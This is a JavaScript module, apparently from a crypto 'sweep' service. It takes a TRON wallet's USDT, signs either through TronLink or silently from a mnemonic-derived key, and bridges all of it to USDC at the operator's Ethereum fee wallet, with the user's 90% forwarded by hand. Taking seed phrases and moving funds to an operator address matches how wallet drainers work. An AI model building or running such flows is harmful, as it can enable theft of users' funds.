/**
 * tron.js — TRON signing + deBridge bridging to USDC on Ethereum.
 *
 * Sweeps TRC-20 USDT only. Native TRX is left alone to cover
 * energy/bandwidth for the outbound bridge transaction.
 *
 * Fee-wallet model: like the other families, USDC is delivered to
 * FEE_WALLET_EVM on Ethereum. The operator forwards 90% to the user's
 * destination manually, keeping 10% plus any sponsorship fee.
 *
 * Two signing paths:
 *   - extension (TronLink): uses window.tron.tronWeb, user approves
 *     each transaction in the TronLink popup.
 *   - mnemonic: a TronWeb instance built from a derived private key
 *     signs silently, no popup.
 *
 * WHY THE IMPORT IS LAZY:
 *   tronweb's module init reads `window` and `localStorage`. In the
 *   browser that's fine. In vitest's `node` environment it throws at
 *   import time. Importing it inside the functions that construct it
 *   defers that failure to the TRON code path.
 *
 * Bridge: deBridge DLN. Chain ID 100000026.
 *
 * TRONWEB v6 NOTES:
 *   - Construct with `new TronWeb({ fullHost })` and call
 *     `setPrivateKey()` separately. The v5 pattern of passing
 *     `privateKey` in the constructor options no longer populates
 *     `defaultAddress`.
 *   - `sendRawTransaction` returns `{ result: true, transaction: {
 *     txID } }` on success, not `{ result: true, txid }`. The
 *     previous code checked for `receipt.txid` which is never set,
 *     causing every live sweep to silently fail at broadcast.
 *   - The v6 constructor has been observed to return an object
 *     missing `.contract` and `.trx` in some builds. To make that
 *     diagnosable, `deriveTron` in derive.js now logs the shape of
 *     the constructed instance and validates `.contract` before
 *     returning.
 */

import { ethers } from 'ethers';
import { FEE_WALLET_EVM, userShare, operatorFee } from './config.js';

const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';
const TRON_DEBRIDGE_CHAIN = 100000026;
const ETH_CHAIN = 1;
const ETH_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

const MIN_SWEEP_USDT_RAW = 1_000_000n;

const READ_ONLY_RPC = 'https://api.trongrid.io';

// Fetch timeout for deBridge and TronGrid calls. Prevents the sweep
// from hanging on a slow endpoint.
const FETCH_TIMEOUT_MS = 15000;

let _readOnlyTronWeb = null;

async function getReadOnlyTronWeb() {
  if (!_readOnlyTronWeb) {
    const { TronWeb } = await import('tronweb');
    _readOnlyTronWeb = new TronWeb({ fullHost: READ_ONLY_RPC });
  }
  return _readOnlyTronWeb;
}

async function fetchWithTimeout(url, options = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Describe the shape of a TronWeb instance for diagnostics.
 *
 * TronWeb v6 has been observed to return a partial object from
 * `new TronWeb({ fullHost })` in some browser builds — the object is
 * truthy but missing `.contract` and `.trx`, which then throws
 * "Cannot read properties of undefined" at the first use. This
 * helper returns a short summary of what methods are present, so the
 * sweep log can report which constructor path failed.
 */
function describeTronWeb(t) {
  if (!t) return 'null/undefined';
  const props = ['contract', 'trx', 'defaultAddress', 'setPrivateKey', 'address'];
  const present = props.filter((p) => typeof t[p] !== 'undefined').map((p) => `${p}:${typeof t[p]}`);
  const missing = props.filter((p) => typeof t[p] === 'undefined');
  return `present=[${present.join(', ')}] missing=[${missing.join(', ')}]`;
}

// =====================================================================
// PROVIDER ACCESS
// =====================================================================

export function getTronLinkWeb() {
  if (typeof window === 'undefined') return null;
  if (!window.tron || !window.tron.tronWeb) return null;
  if (!window.tron.tronWeb.ready) return null;
  return window.tron.tronWeb;
}

export async function connectTronLink() {
  if (typeof window === 'undefined' || !window.tron) {
    throw new Error('TronLink not installed. Install it from tronlink.org, or use the mnemonic method.');
  }
  const accounts = await window.tron.request({ method: 'eth_requestAccounts' });
  if (!accounts || accounts.length === 0) {
    throw new Error('No TRON account authorized in TronLink');
  }
  return accounts[0];
}

export async function tronWebFromPrivateKey(privateKeyHex) {
  const { TronWeb } = await import('tronweb');
  const clean = privateKeyHex.startsWith('0x') ? privateKeyHex.slice(2) : privateKeyHex;
  const tronWeb = new TronWeb({ fullHost: READ_ONLY_RPC });
  tronWeb.setPrivateKey(clean);
  return tronWeb;
}

// =====================================================================
// PREVIEW
// =====================================================================

export async function previewTronWallet(address) {
  const result = { address, trx: null, tokens: [], error: null };
  const tronWeb = getTronLinkWeb() || await getReadOnlyTronWeb();

  if (!tronWeb || typeof tronWeb.trx?.getBalance !== 'function') {
    result.error = `TronWeb instance is unusable (${describeTronWeb(tronWeb)})`;
    return result;
  }

  try {
    const sun = await tronWeb.trx.getBalance(address);
    result.trx = {
      raw: String(sun),
      formatted: (Number(sun) / 1e6).toFixed(6),
      symbol: 'TRX',
    };
  } catch (e) {
    result.error = `TRX balance: ${e.message}`;
  }

  if (typeof tronWeb.contract !== 'function') {
    result.error = (result.error ? result.error + '; ' : '') + `TronWeb has no .contract (${describeTronWeb(tronWeb)})`;
    return result;
  }

  try {
    const contract = await tronWeb.contract().at(TRON_USDT);
    const raw = BigInt((await contract.balanceOf(address).call()).toString());
    if (raw > 0n) {
      result.tokens.push({
        address: TRON_USDT,
        symbol: 'USDT',
        decimals: 6,
        raw: raw.toString(),
        formatted: ethers.formatUnits(raw, 6),
        isStable: true,
      });
    }
  } catch (e) {
    // USDT read failed — empty token list is fine.
  }

  return result;
}

// =====================================================================
// DEBRIDGE — create-tx
// =====================================================================
//
// Always delivers USDC to FEE_WALLET_EVM on Ethereum. The user's
// destination is not passed to deBridge — the operator forwards it
// after settlement, same as the EVM, Solana, and Bitcoin flows.
// =====================================================================

async function createDebridgeOrder({ srcToken, amountRaw, srcAuthority }) {
  const params = new URLSearchParams({
    srcChainId: String(TRON_DEBRIDGE_CHAIN),
    srcChainTokenIn: srcToken,
    srcChainTokenInAmount: amountRaw.toString(),
    dstChainId: String(ETH_CHAIN),
    dstChainTokenOut: ETH_USDC,
    dstChainTokenOutAmount: 'auto',
    dstChainTokenOutRecipient: FEE_WALLET_EVM,
    srcChainOrderAuthorityAddress: srcAuthority,
    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
  });

  const resp = await fetchWithTimeout(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
    headers: { accept: 'application/json' },
  });
  if (!resp.ok) {
    const text = await resp.text();
    throw new Error(`deBridge ${resp.status}: ${text.slice(0, 200)}`);
  }
  const json = await resp.json();
  if (!json.tx || !json.tx.data) {
    throw new Error(`deBridge: no tx in response (${JSON.stringify(json).slice(0, 200)})`);
  }
  return json;
}

// =====================================================================
// SWEEP
// =====================================================================

export async function sweepTron(address, opts = {}) {
  const results = {
    address,
    recipient: FEE_WALLET_EVM,
    swaps: [],
    transfers: [],
    errors: [],
    usdcReceivedRaw: '0',
    userReceivedRaw: '0',
    feeReceivedRaw: '0',
  };

  const dryRun = !!opts.dryRun;

  // Prefer the passed-in TronWeb (from mnemonic derivation) over the
  // TronLink instance. If neither is available and we're not in a dry
  // run, bail out with a clear error.
  const signerTronWeb = opts.tronWeb || getTronLinkWeb();
  if (!dryRun && !signerTronWeb) {
    results.errors.push('No signing wallet — connect TronLink or use a mnemonic');
    return results;
  }

  const tronWeb = signerTronWeb || await getReadOnlyTronWeb();
  const privateKeyHex = opts.privateKey || null;

  // Guard on the TronWeb instance's shape before touching any of its
  // methods. The previous version wrote `!tronWeb.contract || ...`
  // which itself threw when `tronWeb` was undefined — the guard
  // crashed on the very thing it was meant to guard against.
  //
  // The `describeTronWeb` call in the error message surfaces which
  // methods are missing, so the next failure is diagnostic instead
  // of a bare TypeError.
  if (!dryRun) {
    if (!tronWeb) {
      results.errors.push('TronWeb instance is undefined — check derivation or TronLink connection');
      return results;
    }
    if (typeof tronWeb.contract !== 'function') {
      results.errors.push(`TronWeb has no .contract method (${describeTronWeb(tronWeb)})`);
      return results;
    }
    if (typeof tronWeb.trx?.sign !== 'function') {
      results.errors.push(`TronWeb has no .trx.sign method (${describeTronWeb(tronWeb)})`);
      return results;
    }
  }

  // Guard against a signer whose address doesn't match the preview
  // address. If they diverge, the user might sign for a different
  // account than the one we previewed.
  if (!dryRun && tronWeb.defaultAddress?.base58) {
    if (tronWeb.defaultAddress.base58.toLowerCase() !== address.toLowerCase()) {
      results.errors.push(
        `Signer mismatch: ${tronWeb.defaultAddress.base58} vs previewed ${address}`
      );
      return results;
    }
  }

  let usdcReceived = 0n;

  try {
    const contract = await tronWeb.contract().at(TRON_USDT);
    const raw = BigInt((await contract.balanceOf(address).call()).toString());

    if (raw < MIN_SWEEP_USDT_RAW) {
      results.swaps.push({
        symbol: 'USDT',
        status: 'SKIPPED',
        note: `below minimum (${raw} raw, need >= ${MIN_SWEEP_USDT_RAW})`,
      });
    } else if (dryRun) {
      const order = await createDebridgeOrder({
        srcToken: TRON_USDT,
        amountRaw: raw,
        srcAuthority: address,
      });
      const expectedOut = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
      results.swaps.push({
        symbol: 'USDT',
        status: 'DRY_RUN',
        amountIn: ethers.formatUnits(raw, 6),
        amountOutExpected: ethers.formatUnits(expectedOut, 6),
      });
      usdcReceived += expectedOut;
    } else {
      const order = await createDebridgeOrder({
        srcToken: TRON_USDT,
        amountRaw: raw,
        srcAuthority: address,
      });

      const expectedOut = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
      if (expectedOut < MIN_SWEEP_USDT_RAW) {
        results.swaps.push({
          symbol: 'USDT',
          status: 'SKIPPED',
          note: `expected out ${expectedOut} below minimum`,
        });
      } else {
        // Sign. Two paths:
        //   - If we have the private key (mnemonic flow), pass it
        //     explicitly to trx.sign. TronWeb v6 does not use the
        //     private key set via setPrivateKey() for signing without
        //     being told to, and it's safer to be explicit anyway.
        //   - If it's a TronLink instance, trx.sign will trigger a
        //     popup for the user to approve.
        const signed = privateKeyHex
          ? await tronWeb.trx.sign(order.tx, privateKeyHex)
          : await tronWeb.trx.sign(order.tx);

        const receipt = await tronWeb.trx.sendRawTransaction(signed);

        // TronWeb v6 returns { result: true, transaction: { txID } }.
        // v5 returned { result: true, txid }. Handle both, but the
        // primary path is the v6 shape.
        const broadcastOk = receipt && receipt.result === true;
        const txid = receipt?.transaction?.txID || receipt?.txid || signed?.txID;

        if (!broadcastOk || !txid) {
          const reason = receipt?.message || receipt?.code || 'unknown broadcast error';
          throw new Error(`broadcast: ${reason}`);
        }

        usdcReceived += expectedOut;
        results.swaps.push({
          symbol: 'USDT',
          status: 'SUCCESS',
          txid,
          orderId: order.orderId,
          received: ethers.formatUnits(expectedOut, 6),
        });
      }
    }
  } catch (e) {
    const msg = /reject|cancel/i.test(e.message || '') ? 'Cancelled in TronLink' : e.message;
    results.swaps.push({ symbol: 'USDT', status: 'ERROR', error: msg });
  }

  results.usdcReceivedRaw = usdcReceived.toString();
  results.userReceivedRaw = userShare(usdcReceived).toString();
  results.feeReceivedRaw = operatorFee(usdcReceived).toString();

  return results;
}

// =====================================================================
// USD ESTIMATE for the auto-live threshold
// =====================================================================

export async function estimateTronValueUsdc(preview) {
  if (!preview || !preview.tokens) return 0;
  let total = 0;
  for (const t of preview.tokens) {
    if (t.isStable) {
      const amt = parseFloat(t.formatted || '0');
      if (Number.isFinite(amt) && amt > 0) total += amt;
    }
  }
  return total;
}